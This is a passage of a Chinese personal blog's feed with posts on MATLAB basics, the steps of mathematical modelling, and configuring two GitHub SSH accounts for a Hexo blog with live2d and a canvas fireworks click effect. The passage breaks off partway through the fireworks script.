        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数学建模-day2-–-matlab-基本用法"><a href="#数学建模-day2-–-matlab-基本用法" class="headerlink" title="数学建模_day2 – matlab 基本用法"></a>数学建模_day2 – matlab 基本用法</h1><p><img src="https://i.loli.net/2018/10/07/5bb957ec92262.png" alt=""><br>&nbsp; &nbsp; &nbsp; &nbsp; matlab 整体界面如上图，在matlab中一般需要创建变量，调用函数，定义变量和 python 类似，<strong>如果没有定义输出变量，matlab则会使用一个名为ans的变量存储计算结果。</strong></p><p> &nbsp; &nbsp; &nbsp; matlab主要被用来对整个矩阵或者数组进行操作。</p><h3 id="一-那么如何来进行数组的创建呢："><a href="#一-那么如何来进行数组的创建呢：" class="headerlink" title="一. 那么如何来进行数组的创建呢："></a>一. 那么如何来进行数组的创建呢：</h3><ul><li><p>随便创建一个一维数组 a= [1 2 3 4],也可称作单行矩阵或行向量</p><p><img src="https://i.loli.net/2018/10/07/5bb959beb45e8.png" alt=""></p></li><li><p>创建多行矩阵则用分号分开</p><p><img src="https://i.loli.net/2018/10/07/5bb95a474bb84.png" alt=""></p></li></ul><h3 id="二-用函数对矩阵和数组进行一些操作："><a href="#二-用函数对矩阵和数组进行一些操作：" class="headerlink" title="二. 用函数对矩阵和数组进行一些操作："></a>二. 用函数对矩阵和数组进行一些操作：</h3><ul><li><p>sin,cos,tan,cot等函数都能使用:</p><p><img src="https://i.loli.net/2018/10/07/5bb95b8054e4c.png" alt=""></p></li><li><p>矩阵的加减乘除以及转置（共轭转置为 b’ ,非共轭转置为运算 b.’对于实数没有区别) ,人性化的报错😄好评：</p><p><img src="https://i.loli.net/2018/10/07/5bb95c2d99dcf.png" alt=""></p></li><li><p>矩阵求逆运算 inv 函数：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95d8d1797d.png" class="lazyload"></p></li><li><p>格式化输出 format short(long)：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95e3e30a1b.png" class="lazyload"></p></li><li><p>矩阵每一个元素的平方（s.*s)，立方(s.^3)操作：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95ed30a03c.png" class="lazyload"></p></li><li><p>矩阵的扩充操作：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95f5d5a4e8.png" class="lazyload"></p><h3 id="三-工作空间变量"><a href="#三-工作空间变量" class="headerlink" title="三. 工作空间变量"></a>三. 工作空间变量</h3></li><li><p>magic 和 rand ，以及whos命令</p><p>magic是一种用于产生魔方矩阵的函数，产生的矩阵的每行、列以及对角线的数之和相等。该和的值为1+2+3+…..+n^2的和再除以n，n必须为大于或等于3的整数。 </p><p>rand函数则用于产生由在(0, 1)之间均匀分布的随机数组成的数组 ，如rand（4）则是产生一个1行4列的数组，rand（2，3）则是2行3列矩阵，rand（2，3，4）则是四个2行3列的矩阵</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb961e66a53f.png" class="lazyload"></p></li><li><p>save，load，clear 命令。save用于保存数据到 mat文件中，load用于加载mat文件，clear则是清除当前工作区变量。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9628c75d19.png" class="lazyload"></p></li></ul><h3 id="四-字符和字符串操作"><a href="#四-字符和字符串操作" class="headerlink" title="四. 字符和字符串操作"></a>四. 字符和字符串操作</h3><ul><li><p>定义字符和字符串：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb963f2ec434.png" class="lazyload"></p></li><li><p>数字转字符，字符拼接（int2str or num2str函数）：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb965001606c.png" class="lazyload"></p><h3 id="五-调用函数"><a href="#五-调用函数" class="headerlink" title="五. 调用函数"></a>五. 调用函数</h3></li><li><p>matlab 和大多数编程语言一样，提供了很多函数来简化代码提高效率，例如常见的 min，max函数，且函数同样具有返回值类型，个数等条件:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9674e3f44e.png" class="lazyload"></p></li><li><p>zeros，ones 函数，生成特定矩阵（全零或者全一）：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb967c6a83a3.png" class="lazyload"></p></li><li><p>size，sum函数，size用于计算大小，如矩阵的行列数，sum则用于求和，两者传参有相似之处：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb968c8cee9a.png" class="lazyload"></p></li></ul><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9687d4ff42.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模_day1</title>
      <link href="/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
      <url>/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数学建模-day1–初入数模"><a href="#数学建模-day1–初入数模" class="headerlink" title="数学建模_day1–初入数模"></a>数学建模_day1–初入数模</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为一个大二刚开始的学生才真正接触数模，虽然有点晚了，但我相信有付出，就有回报，没有付出就没有馅饼😄。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模是什么东西呢？简单来说就是通过数学的符号和语言作表述来建立数学模型，而此数学模型首先是根据实际问题建立的，通过这个建立的数学模型，我们可以去解决一个实际的问题，如共享单车，城市排污等等问题。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模的过程包括表述，求解，解释，检验四个过程。可细分为七个步骤：模型准备，模型假设，模型构成，模型求解，模型分析，模型检验，模型应用。</p><h3 id="1-模型准备"><a href="#1-模型准备" class="headerlink" title="1.模型准备"></a>1.模型准备</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为建模的第一步，我们首先应该了解给出的那个问题的实际背景，再明确建模的目的，从而可以针对性地搜集有关的信息，掌握模型对象的特征之后，在我们脑海中形成一个比较清晰的问题。比如共享单车的投放问题，面对这个问题我们首先就知道了需要得出一个合理的投放量，那么我们就需要从多方面来获取信息，如各地人口数量，交通情况，以及基础设施完善程度等等信息，来丰富这个模型的特征，进而建立出合理的模型来解决共享单车的投放问题。<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3 id="2-模型假设"><a href="#2-模型假设" class="headerlink" title="2.模型假设"></a>2.模型假设</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 在模型假设这一步中，很明显你建立出来的模型是否合理取决于它的可用性，针对问题的特点和建模目的，要做出最合理的模型假设，怎么个合理法呢？那就是要符合实际情况，如物质成本，时间成本，空间成本等等条件。<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3 id="3-模型构成"><a href="#3-模型构成" class="headerlink" title="3.模型构成"></a>3.模型构成</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 模型的构成就需要我们好好讲究了，正所谓讲究而不将就，如何在实际情况与构成难度之间做出最合适的表达也是一门艺术。这一步我们需要尽量采用简单普遍的数学工具来构成模型。<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3 id="4-模型求解"><a href="#4-模型求解" class="headerlink" title="4.模型求解"></a>4.模型求解</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过各种数学方法，软件（matlab，mathematical，lingo），以及计算机编程技术，来对模型进行高效率地求解。</p><h3 id="5-模型分析"><a href="#5-模型分析" class="headerlink" title="5.模型分析"></a>5.模型分析</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 对求出来的结果进行误差分析，统计分析，以及模型对数据的稳定性分析（机器学习也有涉及：1. 计算的稳定性(Computational Stability)；2. 数据稳定性；3. 性能的稳定性 [参考链接]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）</a></p><h3 id="6-模型检验"><a href="#6-模型检验" class="headerlink" title="6.模型检验"></a>6.模型检验</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学讲究一个严谨，因而在模型求解之后进行检验那是必然的。我们需要将解出来的数据与实际现象，现实数据比较，从而检验模型的合理性。</p><h3 id="7-模型应用"><a href="#7-模型应用" class="headerlink" title="7.模型应用"></a>7.模型应用</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 当模型能够得到应用时，说明这是个成熟的模型了，该学会自己解决问题了（脑补 成熟的模型.jpg😄)。</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>多Git账户以及Hexo搭建博客进阶</title>
      <link href="/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"/>
      <url>/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="多Git账户以及Hexo搭建博客进阶"><a href="#多Git账户以及Hexo搭建博客进阶" class="headerlink" title="多Git账户以及Hexo搭建博客进阶"></a>多Git账户以及Hexo搭建博客进阶</h1><h2 id="1-生成密钥"><a href="#1-生成密钥" class="headerlink" title="1.生成密钥"></a>1.生成密钥</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb631dc309a8.png" alt=""></p><p>可以看到已经生成的id_rsa是0LinkSec git账户的密钥</p><p>而yof3ng的则是我准备搭建的第二个hexo的密钥</p></blockquote><h2 id="2-配置config文件"><a href="#2-配置config文件" class="headerlink" title="2.配置config文件"></a>2.配置config文件</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#userName1(yof3ng@gmail.com)0LinkSec Lab</span>Host 0LinkSecHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token comment" spellcheck="true">#userName2 yof3ng@qq.com</span>Host yof3ngHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>yof3ng</code></pre><p>需要注意的是缩进问题，缩进可能会产生报错。</p><p>在github上添加完ssh密钥之后即可进行下一步</p></blockquote><h2 id="3-git连接测试"><a href="#3-git连接测试" class="headerlink" title="3.git连接测试"></a>3.git连接测试</h2><blockquote><p>第一个账户git@0LinkSec：</p><p><img src="https://i.loli.net/2018/10/04/5bb632d0def6c.png" alt=""></p><p>第二个账户git@yof3ng：</p><p><img src="https://i.loli.net/2018/10/04/5bb632ecc2c9c.png" alt=""></p><p>两个账户已经建立成功，接下来即可进行第二个hexo的搭建。</p></blockquote><h2 id="4-第二个hexo初始化后配置-config文件"><a href="#4-第二个hexo初始化后配置-config文件" class="headerlink" title="4.第二个hexo初始化后配置 config文件"></a>4.第二个hexo初始化后配置 config文件</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb6376eaf144.png" alt=""></p><p>​    强调repository项：应该设置为前面设置的第二用户,若为<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>则会默认为第一用户，连接0LinkSec。</p><p>到此第二hexo搭建成功。</p></blockquote><h2 id="5-souce目录下CNAME文件建立，以及域名CNAME记录建立"><a href="#5-souce目录下CNAME文件建立，以及域名CNAME记录建立" class="headerlink" title="5.souce目录下CNAME文件建立，以及域名CNAME记录建立"></a>5.souce目录下CNAME文件建立，以及域名CNAME记录建立</h2><blockquote><p>在域名解析处新建yof3ng二级域名CNAME记录，指向 yof3ng.github.io,以及在hexo根目录下的source文件夹建立CNAME文件，将yof3ng.0Link.top填入其中即可。</p><p><img src="https://i.loli.net/2018/10/05/5bb76525ca26d.png" alt=""></p></blockquote><h2 id="6-开启强制https服务选项"><a href="#6-开启强制https服务选项" class="headerlink" title="6.开启强制https服务选项"></a>6.开启强制https服务选项</h2><p>在github 对应仓库中的setting中设置即可。</p><h2 id="7-添加萌宠精灵"><a href="#7-添加萌宠精灵" class="headerlink" title="7.添加萌宠精灵"></a>7.添加萌宠精灵</h2><blockquote><p><a href="https://blog.csdn.net/Aoman_Hao/article/details/82049821" target="_blank" rel="noopener">参考</a>链接</p><p>切换到博客目录然后输入：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#安装live2d</span>npm install <span class="token operator">-</span><span class="token operator">-</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span class="token comment" spellcheck="true">#安装萌宠module</span>npm install live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>koharu </code></pre><p>添加在config文件内：</p><pre class=" language-shell"><code class="language-shell">live2d:  enable: true  scriptFrom: local  model:    use: live2d-widget-model-koharu  display:    position: right    width: 140    height: 260  mobile:    show: true</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb847f7047c9.png" class="lazyload"></p></blockquote><h2 id="8-添加鼠标点击特效"><a href="#8-添加鼠标点击特效" class="headerlink" title="8.添加鼠标点击特效"></a>8.添加鼠标点击特效</h2><blockquote><p>添加鼠标点击爆炸效果：<br>在主题的js目录下创建fireworks.js并写入如下代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token 